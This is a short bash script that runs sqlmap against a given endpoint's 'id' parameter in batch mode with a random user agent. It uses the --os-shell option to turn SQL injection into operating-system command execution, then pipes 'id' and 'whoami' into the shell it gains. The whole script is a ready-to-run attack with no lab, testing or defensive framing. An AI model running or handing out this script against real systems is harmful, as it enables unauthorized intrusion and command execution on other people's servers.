#!/bin/bash
set -euo pipefail

ENDPOINT="${1:?Usage: $0 <ENDPOINT>}"

BASE_URL=$(echo "$ENDPOINT" | sed 's/\?.*$//')

echo -e "id\nwhoami\nexit" | sqlmap -u "${BASE_URL}?id=1" \
  --batch --random-agent \
  --os-shell \
  --threads=4 \
  2>&1 | tail -30
